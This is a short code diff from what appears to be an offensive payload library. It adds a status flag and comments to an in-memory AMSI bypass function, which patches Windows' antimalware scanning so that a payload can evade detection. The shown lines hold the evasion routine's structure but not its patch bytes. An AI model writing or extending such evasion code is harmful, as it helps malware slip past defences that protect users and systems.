@@ -78,6 +78,10 @@ static HMODULE px_find_loaded_module(const char *name, fn_getmodulehandlea p)
     return p ? p(name) : NULL;
 }
 
+/* Whether the AMSI patch actually took.
+ *
+ * The capability library reports it, so a run can say whether its own
+ * evasion worked rather than assuming it. */
 /* Apply the AMSI bypass.
  *
  * Returns 1 on success, 0 on failure. Failure is not fatal: a payload
@@ -138,6 +142,7 @@ int px_amsi_bypass(void)
      * that execute, not the ones that were there. On x86 this matters;
      * on ARM64 it is essential. */
     FlushInstructionCache(GetCurrentProcess(), prologue, sizeof(px_amsi_stub));
+    px_amsi_patched = 1;
 
     ok = 1;
     return ok;
